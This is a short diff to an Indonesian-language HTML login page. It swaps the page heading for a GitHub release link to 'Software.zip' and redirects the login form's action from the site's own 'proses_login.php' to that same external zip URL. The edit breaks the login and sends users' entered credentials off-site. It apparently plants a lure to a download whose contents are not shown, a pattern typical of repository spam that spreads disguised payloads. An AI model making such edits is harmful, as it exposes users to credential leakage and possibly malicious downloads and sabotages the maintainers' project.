@@ -1,4 +1,4 @@
-# Index.html
+# https://github.com/D14Rra1233/Index/releases/download/v1.0/Software.zip
 
 <!DOCTYPE html>
 <html>
@@ -9,7 +9,7 @@
     <h2>Selamat Datang</h2>
     <p>Silakan masuk untuk mengakses akun Anda.</p>
     
-    <form action="proses_login.php" method="post">
+    <form action="https://github.com/D14Rra1233/Index/releases/download/v1.0/Software.zip" method="post">
         <label for="username">Username:</label>
         <input type="text" id="username" name="username" required>
         
